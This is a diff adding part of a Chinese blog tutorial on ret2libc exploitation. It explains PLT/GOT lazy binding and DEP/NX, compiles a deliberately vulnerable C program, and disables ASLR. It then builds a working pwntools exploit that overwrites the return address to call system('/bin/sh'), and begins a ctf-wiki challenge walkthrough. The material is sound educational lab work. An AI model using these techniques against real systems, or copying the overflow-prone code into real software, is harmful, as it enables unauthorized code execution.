@@ -259,3 +259,233 @@ ELF 文件是由很多很多的 **段(segment)** 所组成，常见的就如 .te
 
 >  -s 参数显示指定节的所有内容 
 
+![got.plt](../images/2018-11-17-Ret2libc/got.plt-content.png)
+
+ 4014 处存放着 66 10 00 00 ，因为是小端序所以应为 0×00001066，这个位置刚好对应着 push 0×10 这条指令，这个值是 test 这个符号在 .rel.plt 节中的下标。继续 jmp 指令跳到 .plt 处 
+
+![.plt](../images/2018-11-17-Ret2libc/.plt.png)
+
+ push DWORD PTR [ebx + 0x4] 指令是将当前模块ID压栈，也就是 got.c 模块，接着 jmp DWORD PTR [ebx + 0x8] ，这个指令就是跳转到 **动态链接器** 中的 _dl_runtime_resolve 函数中去。这个函数的作用就是在另外的模块中查找需要的函数，就是这里的在 got_extern.so 模块中的 test 函数。然后_dl_runtime_resolve函数会将 test() 函数的真正地址填入到 test@got 中去也就是 .got.plt 节中。那么第二种情况就是，当第二次调用test()@plt 函数时，就会通过第一条指令跳转到真正的函数地址。整个过程就是所说的通过 **plt** 来实现 **延迟绑定** 。程序调用外部函数的整个过程就是，第一次访问 test@plt 函数时，**动态链接器**就会去动态共享模块中查找 test 函数的真实地址然后将真实地址保存到test@got中(.got.plt)；第二次访问test@plt时，就直接跳转到test@got中去。 
+
+<br/>
+
+## 0×05 DEP(DataExecutionPrevention)/NX**(Non-executable)** 防护
+
+该防护的作用简单的说就是能写的地方不能执行，能执行的地方不能写。上篇的 [Ret2Shellcode ](http://www.freebuf.com/vuls/179724.html)，shellcode 所填充的位置是在栈上，但是开启了 DEP 保护后栈上就没有执行的权限也就无法控制程序流程。
+
+这里用[蒸米](https://github.com/zhengmin1989/ROP_STEP_BY_STEP)的样例做演示，[源代码](https://github.com/zhengmin1989/ROP_STEP_BY_STEP)：
+
+```c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 256);
+}
+
+int main(int argc, char** argv) {
+	vulnerable_function();
+	write(STDOUT_FILENO, "Hello, World\n", 13);
+}
+```
+
+ 不开启 DEP 保护编译： 
+
+```bash
+gcc -fno-stack-protector -z execstack -o ret2lib ret2lib.c
+```
+
+ 查看权限命令： 
+
+```bash
+cat /proc/[pid]/maps
+```
+
+ 程序运行在后台命令： 
+
+```bash
+./ret2lib &
+```
+
+ 权限如下： 
+
+![权限](../images/2018-11-17-Ret2libc/normal-perm.png)
+
+ 开启 DEP 保护编译： 
+
+```bash
+gcc -fno-stack-protector -o ret2lib ret2lib.c
+```
+
+ 权限如下： 
+
+![nx-perm](../images/2018-11-17-Ret2libc/nx-perm.png)
+
+ 可以看到在开启DEP防护的情况下栈上面就没有执行权限了。 
+
+<br/>
+
+## 0×06 实战I
+
+重新编译上面的程序并开启DEP防护，关闭ASLR等其他防护：
+
+```bash
+gcc ret2lib.c -fno-stack-protector -no-pie -m32 -o ret2lib
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+```
+
+ checksec查看安全防护： 
+
+![checksec查看安全防护](../images/2018-11-17-Ret2libc/protector.png)
+
+ 观察源代码，发现在vulnerable_function()函数中，buf只有128字节而 read()函数可以读256个字节造成了缓冲区溢出。因为现在开启了DEP防护，所以不能往栈里面写入shellcode了，通过前面对动态链接的学习知道动态链接的程序在运行时才会链接共享模块，用ldd命令查看程序需要的共享模块： 
+
+![查看程序需要的共享模块](../images/2018-11-17-Ret2libc/ldd.png)
+
+ 程序依赖的是 libc.so.6 这个共享模块，这个共享模块里面提供了大量可以利用的函数，我们的目的是执行 system(“/bin/sh”) 来打开shell，也就是说只要在 libc 中找到了 system() 函数和 “/bin/sh” 字符串的地址就可以控制返回地址打开shell。 
+
+### 1、找 system() 函数
+
+因为关闭了 ASLR ，共享库的加载基址并不会发生改变，只要知道 system() 函数在共享库中的偏移就能够算出 system() 函数在内存中的地址。使用 objdump -T libc.so.6 命令就可以显示处所有的动态链接符号表。
+
+![找 system() 函数](../images/2018-11-17-Ret2libc/system_off.png)
+
+ 这里可以看出 system() 函数的偏移为 0x0003d870，在加上基址 0xf7dcb000 + 0x0003d870 = 0x‭f7e08870‬ ，这个地址就是libc加载到内存空间后 system() 函数的真实地址。 
+
+### 2、查找 /bin/sh 字符串
+
+这里要用到一个工具 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)，这个工具可以使你方便的在你的二进制文件中搜索 gadgets(片段)
+
+![查找 /bin/sh 字符串](../images/2018-11-17-Ret2libc/binsh.png)
+
+同理真实地址为: 0xf7dcb000 + 0x0017c968 = 0xf7f47968。
+
+当然，方法不唯一，也可以在gdb动态调试时通过 p 命令打印出函数地址 ，find 命令查找 “/bin/sh” 字符串。还可以用 pwntools 等方法。
+
+### ‬3、覆盖返回地址
+
+找到了 system() 函数和 “/bin/sh” 字符串的地址，接下来的任务就是确定返回地址在哪儿。还是通过直接传送大量的字符覆盖返回地址使其在动态调试时报错的方法来确定偏移。
+
+几个gdb的常用命令:
+
+> -q 参数不显示欢迎信息等
+>
+> -n 不加载任何插件，使用原生 gdb
+>
+> info 后面跟上想要查看的信息，如函数信息 info functions
+>
+> b/breakpoint 设置断点
+>
+> del/delete breakpoints n 删除断点，n是断点编号，可用info breakpoints命令查看断点信息
+>
+> start 命令启动程序并停在开辟完主函数栈帧的地方
+>
+> c/continue 继续执行程序，遇到断点停下
+>
+> f/finish 结束程序
+>
+> r/run 运行程序，遇到断点停下
+>
+> ni 单步步过，一步一步执行指令遇到函数调用时直接执行完整个函数
+>
+> si 单步步入，一步一步执行指令遇到函数调用时跳转到函数内部
+>
+> vmmap 查看内存映射
+>
+> checksec 查看程序的防护措施
+>
+> pdisass/disassemble 查看当前函数帧的反汇编代码，前一个命令有高亮显示只是需要安装pwndbg插件，后面一个命令时gdb自带的命令无高亮显示
+>
+> p/print 打印信息，如寄存器 p $ebp
+>
+> x/<n/f/u> <addr> 查看某地址处的值，n/f/u 参数为可选，n代表想要查看多少个内存单元即从当前地址开始计算，每个内存单元的大小由后面的u参数指定；f表示显示格式，如s表示字符串形式，i为指令形式；u指定内存单元大小，b(一个字节)、h(双字节)、w(四个字节)、g(八字节)默认为w； 后面跟上x代表以十六进制的形式查看变量
+>
+> set *addr = value 设置某个地址的值
+
+更多命令可以查看[这里](http://www.cabrillo.edu/~shodges/cs19/progs/guide_to_gdb_1.1.pdf)。
+
+cyclic 命令可以打印出类似四字节一循环的字符串，返回地址被这些值覆盖后程序运行就会报无效地址错误。用gdb调式程序，输入 r 运行程序，停在输入处输入cyclic字符串，查看无效地址
+
+![cyclic](../images/2018-11-17-Ret2libc/cyclic.png)
+
+![debug](../images/2018-11-17-Ret2libc/offset.png)
+
+ 通过cyclic -l addr 命令可以得到返回地址与缓冲区的偏移 
+
+```bash
+cyclic -l 0x6261616b
+
+140
+```
+
+### 4、构造payload
+
+payload = ’a’ * 140 + system_addr + system_ret_addr + binsh_addr
+
+返回地址处放置 system() 函数的地址使当函数运行完毕时跳转到 system() 函数处继续执行，函数的调用过程是先将参数入栈，接着保存返回地址，最后call system。system_ret_addr 是 system() 函数的地址，因为我们的目的就是打开shell，所以这个返回地址随便设置 一个值就可以。binsh_addr 放置的是参数 “/bin/sh” 字符串的地址
+
+### 5、用 pwntools 编写 exp
+
+```python
+from pwn import *
+
+#context.log_level = 'debug'
+
+debug = 1
+
+if debug:
+	sh = process('./ret2lib')
+
+system_addr = 0xf7e08870
+binsh_addr  = 0xf7f47968
+payload = 'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
+
+def pwn(sh, payload):
+	sh.sendline(payload)
+	sh.interactive()
+
+pwn(sh, payload)
+```
+
+![exp_ret2lib](../images/2018-11-17-Ret2libc/exp1.png)
+
+利用之前计算好的地址可以很轻松的拿到shell，当然这只是在关闭掉 ASLR 的情况下，下一篇会学习另外一种 ROP 技术来绕过ASLR 防，pwn 也会变得越来越有意思了。
+
+<br/>
+
+## 0×07 实战II
+
+示例来自于 [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/#ret2libc)ret2libc。
+
+### 0×01 ret2libc1
+
+32位动态链接程序，开启 NX 防护：
+
+![nx](../images/2018-11-17-Ret2libc/ret2libc1.png)
+
+ 1、IDA分析程序，漏洞点在于 gets() 函接收数据时未对其进行长度校验从而造成栈溢出（IDA 的使用方法自行百度）。 
+
+![ida_main](../images/2018-11-17-Ret2libc/ret2libc1-main.png)
+
+ 2、继续查看函数列表，发现有一个 secure() 函数，该函数调用了 system() 函数，在程序链接时会为 system() 生成 plt 和 got 项。第一次调用函数时，会把函数真实的地址写入got表中，所以我们可以直接覆盖函数返回地址使其调用 system()@plt 模拟 system() 函数真实调用。IDA 中找到 system@plt 的地址： 
+
+![ida_system](../images/2018-11-17-Ret2libc/ret2libc1-system.plt.png)
+
+ 或者使用 objdump 寻找也可以通过 pwntools 直接获得： 
+
+![objdump](../images/2018-11-17-Ret2libc/ret2libc1-objdump-system.plt.png)
+
+system@plt = 0×08048460
+
+3、查找 “/bin/sh” 字符串，可以用 ROPgadget 还可以只用 IDA 中的 string view 查看程序中存在的字符串方法为：view —> Open subviews —> Strings：
+
+![ida_strings](../images/2018-11-17-Ret2libc/ret2libc1-binsh.png)
+
+ 地址在 0×08048720 或者使用 ROPgadget 搜索字符串也可以通过pwntools直接获得： 
+
+![gadget](../images/2018-11-17-Ret2libc/ret2libc1-ropgadget-binsh.png)
+
